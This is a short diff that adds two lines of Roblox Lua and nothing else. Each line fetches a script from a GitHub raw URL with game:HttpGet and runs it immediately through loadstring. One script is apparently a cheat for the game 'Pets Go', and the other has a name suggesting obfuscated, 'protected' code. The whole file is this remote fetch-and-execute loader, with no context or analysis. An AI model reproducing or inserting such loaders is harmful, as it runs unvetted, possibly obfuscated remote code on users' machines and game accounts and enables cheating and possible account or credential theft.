@@ -1,0 +1,3 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GodScripter69/Petsgo/refs/heads/main/Petgo"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/Script/main/Protected_58ec698f188cc76c40aad846.lua"))() 
